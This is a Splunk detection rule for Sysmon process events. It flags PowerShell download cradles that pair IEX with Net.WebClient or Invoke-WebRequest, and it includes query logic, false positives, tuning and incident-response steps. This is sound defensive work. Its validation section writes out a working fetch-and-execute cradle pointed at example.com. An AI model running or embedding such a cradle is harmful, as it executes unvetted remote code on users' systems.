---
id: win_sysmon_t1059.001_powershell_download_cradle
title: PowerShell download cradle (IEX + Net.WebClient or Invoke-WebRequest)
status: testing
author: LordMonstey
created: 2026-04-28
modified: 2026-04-28
severity: high
risk_score: 70
attack:
  - tactic: execution
    technique: T1059.001
    sub_technique_name: PowerShell
  - tactic: command-and-control
    technique: T1105
    sub_technique_name: Ingress Tool Transfer
data_source:
  index: sysmon
  sourcetype: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
  event_codes: [1]
mitre_data_component: Process Creation
schedule:
  cron: "*/5 * * * *"
  earliest: "-10m@m"
  latest:   "-1m@m"
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - powershell
  - execution
  - c2
  - cradle
---

## Hypothesis

PowerShell "download cradles" pipe content fetched from the network straight into the interpreter without writing to disk, defeating naive file-based detection. The combination of `IEX` (or `Invoke-Expression`) with a network primitive (`Net.WebClient`, `Invoke-WebRequest`, `Start-BitsTransfer`) is a high-confidence signal: legitimate scripts overwhelmingly land payloads to disk first.

## Logic

```spl
`sysmon_process_creation`
(process_name="powershell.exe" OR process_name="pwsh.exe")
| where match(CommandLine, "(?i)(iex|invoke-expression)") AND match(CommandLine, "(?i)(downloadstring|downloadfile|invoke-webrequest|iwr\s|net\.webclient|start-bitstransfer|webclient\)\.downloadstring)")
| `cim_endpoint_processes_rename`
| stats count min(_time) as firstTime max(_time) as lastTime
        values(CommandLine) as commandlines
        values(parent_process_name) as parents
        by dest user process_name process_guid
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
```

## Known false positives

- Chocolatey/Scoop installers: `iex (iwr 'https://chocolatey.org/install.ps1')` — single-shot during workstation provisioning, expected on developer assets only
- Certain in-house deployment scripts using the same pattern — must be allowlisted explicitly with the URL fragment, not the command pattern

## Tuning

- Allowlist URLs (not commands) via `lookups/allowlist_pwsh_download_url.csv` if you have known internal tooling
- Suppression: 1 hour per `(dest, process_guid)`

## Validation

- Atomic Red Team: T1059.001 #11 — PowerShell DownloadString
- Atomic Red Team: T1105 #5 — PowerShell Invoke-WebRequest

Manual reproduction:

```powershell
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.com/atomic-test.txt')"
```

## Response

See [`docs/runbooks/powershell-suspicious-execution.md`](../docs/runbooks/powershell-suspicious-execution.md).

Specific to download cradles:

1. Resolve the URL — VirusTotal, urlscan.io, internal proxy logs
2. If the URL resolves to a non-RFC1918 IP not in the asset baseline → confirmed C2 attempt, isolate
3. Pull `index=sysmon eventtype=sysmon_network_connection process_guid=<guid>` to see what was actually retrieved
4. PowerShell module logging (EID 4104) often holds the deobfuscated payload if AMSI was active
